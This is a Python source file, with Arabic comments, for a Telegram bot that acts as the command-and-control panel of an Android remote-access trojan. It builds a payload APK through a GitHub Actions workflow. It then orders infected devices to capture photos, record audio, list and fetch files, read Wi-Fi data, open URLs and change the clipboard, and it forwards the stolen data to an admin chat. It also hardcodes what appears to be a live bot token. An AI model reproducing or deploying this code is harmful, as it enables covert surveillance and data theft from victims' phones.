import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import requests
import os
import time
from datetime import datetime

# إعداد البوت
TOKEN = "7298452746:AAHH6BSnBkuYNwAL7S0N33av4VXw_wvbaPM"  # تأكد من أمانه
ADMIN_CHAT_ID = "670531769"
import os
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")  # أنشئه من GitHub (Settings > Developer settings > Personal access tokens)
REPO = "svvz2/mybot"  # استبدل بـ username/repository

bot = telebot.TeleBot(TOKEN)

# إعداد قاعدة بيانات SQLite
conn = sqlite3.connect('clients.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS clients 
                (client_id TEXT PRIMARY KEY, last_seen TIMESTAMP)''')
conn.commit()

# وظيفة لتسجيل عميل
def register_client(client_id):
    cursor.execute("INSERT OR REPLACE INTO clients (client_id, last_seen) VALUES (?, ?)",
                  (client_id, datetime.now()))
    conn.commit()

# إنشاء القائمة الرئيسية
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("سرد العملاء", callback_data="list_clients"))
    markup.row(InlineKeyboardButton("إنشاء بايلود", callback_data="generate_payload"))
    return markup

# إنشاء قائمة العملاء
def clients_menu():
    cursor.execute("SELECT client_id, last_seen FROM clients")
    clients = cursor.fetchall()
    markup = InlineKeyboardMarkup()
    for client in clients:
        markup.add(InlineKeyboardButton(f"العميل {client[0]}", callback_data=f"client_{client[0]}"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
    return markup

# إنشاء قائمة وظائف العميل
def client_menu(client_id):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("التقاط صورة", callback_data=f"photo_{client_id}"))
    markup.row(InlineKeyboardButton("معلومات الجهاز", callback_data=f"info_{client_id}"))
    markup.row(InlineKeyboardButton("سرد الملفات", callback_data=f"files_{client_id}"))
    markup.row(InlineKeyboardButton("طلب ملف", callback_data=f"get_file_{client_id}"))
    markup.row(InlineKeyboardButton("بيانات Wi-Fi", callback_data=f"wifi_{client_id}"))
    markup.row(InlineKeyboardButton("تسجيل الصوت", callback_data=f"record_audio_{client_id}"))
    markup.row(InlineKeyboardButton("فتح رابط", callback_data=f"open_url_{client_id}"))
    markup.row(InlineKeyboardButton("تعديل الحافظة", callback_data=f"set_clipboard_{client_id}"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="list_clients"))
    return markup

# وظيفة لبدء البوت
@bot.message_handler(commands=['start'])
def start(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        bot.reply_to(message, "غير مصرح لك بالوصول.")
        return
    bot.reply_to(message, "مرحبًا! البوت جاهز للتحكم بأجهزة Android.", reply_markup=main_menu())

# معالجة الأزرار
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.message.chat.id) != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "غير مصرح لك!")
        return

    if call.data == "main_menu":
        bot.edit_message_text("اختر خيارًا:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())

    elif call.data == "list_clients":
        bot.edit_message_text("العملاء المتصلون:", call.message.chat.id, call.message.message_id, reply_markup=clients_menu())

    elif call.data == "generate_payload":
        try:
            headers = {
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json"
            }
            payload = {
                "ref": "main",
                "inputs": {
                    "bot_token": TOKEN,
                    "admin_chat_id": ADMIN_CHAT_ID
                }
            }
            response = requests.post(
                f"https://api.github.com/repos/{REPO}/actions/workflows/build-apk.yml/dispatches",
                json=payload, headers=headers
            )

            if response.status_code == 204:
                bot.send_message(call.message.chat.id, "تم بدء إنشاء البايلود. انتظر 5-10 دقائق...")
                time.sleep(300)  # انتظر 5 دقائق
                runs = requests.get(
                    f"https://api.github.com/repos/{REPO}/actions/runs",
                    headers=headers
                ).json()
                for run in runs["workflow_runs"]:
                    if run["name"] == "Build Android APK" and run["status"] == "completed":
                        if run["conclusion"] == "success":
                            artifacts = requests.get(run["artifacts_url"], headers=headers).json()
                            for artifact in artifacts["artifacts"]:
                                if artifact["name"] == "mybot-apk":
                                    apk_url = artifact["archive_download_url"]
                                    apk_response = requests.get(apk_url, headers=headers)
                                    with open("mybot.apk", "wb") as f:
                                        f.write(apk_response.content)
                                    with open("mybot.apk", "rb") as f:
                                        bot.send_document(call.message.chat.id, f)
                                    os.remove("mybot.apk")
                                    bot.answer_callback_query(call.id, "تم إنشاء البايلود وإرساله!")
                                    return
                bot.answer_callback_query(call.id, "حدث خطأ أثناء إنشاء البايلود.")
            else:
                bot.answer_callback_query(call.id, "فشل بدء إنشاء البايلود.")
        except Exception as e:
            bot.answer_callback_query(call.id, f"خطأ: {str(e)}")

    elif call.data.startswith("client_"):
        client_id = call.data.split("_")[1]
        cursor.execute("SELECT client_id FROM clients WHERE client_id = ?", (client_id,))
        if not cursor.fetchone():
            bot.answer_callback_query(call.id, "العميل غير موجود.")
            return
        bot.edit_message_text(f"وظائف العميل {client_id}:", call.message.chat.id, call.message.message_id, reply_markup=client_menu(client_id))

    elif call.data.startswith("photo_"):
        client_id = call.data.split("_")[1]
        bot.send_message(client_id, "/capture_photo")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("info_"):
        client_id = call.data.split("_")[1]
        bot.send_message(client_id, "/device_info")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("files_"):
        client_id = call.data.split("_")[1]
        bot.send_message(client_id, "/list_files")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("get_file_"):
        client_id = call.data.split("_")[2]
        bot.send_message(call.message.chat.id, f"أدخل مسار الملف للعميل {client_id} (مثال: /sdcard/example.txt):")
        bot.register_next_step_handler(call.message, lambda msg: request_file(msg, client_id))
        bot.answer_callback_query(call.id, "يرجى إدخال المسار.")

    elif call.data.startswith("wifi_"):
        client_id = call.data.split("_")[1]
        bot.send_message(client_id, "/wifi")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("record_audio_"):
        client_id = call.data.split("_")[2]
        bot.send_message(client_id, "/record_audio 10")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("open_url_"):
        client_id = call.data.split("_")[2]
        bot.send_message(client_id, "/open_url https://example.com")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

    elif call.data.startswith("set_clipboard_"):
        client_id = call.data.split("_")[2]
        bot.send_message(client_id, "/set_clipboard test_text")
        bot.answer_callback_query(call.id, "تم إرسال الأمر.")

# وظيفة لطلب ملف
def request_file(message, client_id):
    file_path = message.text.strip()
    if not file_path:
        bot.reply_to(message, "يرجى تحديد مسار الملف.")
        return
    bot.send_message(client_id, f"/get_file {file_path}")
    bot.reply_to(message, f"تم إرسال طلب الملف {file_path} إلى العميل {client_id}.")

# استقبال البيانات من العملاء
@bot.message_handler(content_types=['photo', 'text', 'document', 'audio'])
def handle_client_data(message):
    if str(message.chat.id) not in [row[0] for row in cursor.execute("SELECT client_id FROM clients")]:
        return
    bot.forward_message(ADMIN_CHAT_ID, message.chat.id, message.message_id)
    register_client(str(message.chat.id))

# تشغيل البوت
bot.polling(none_stop=True)
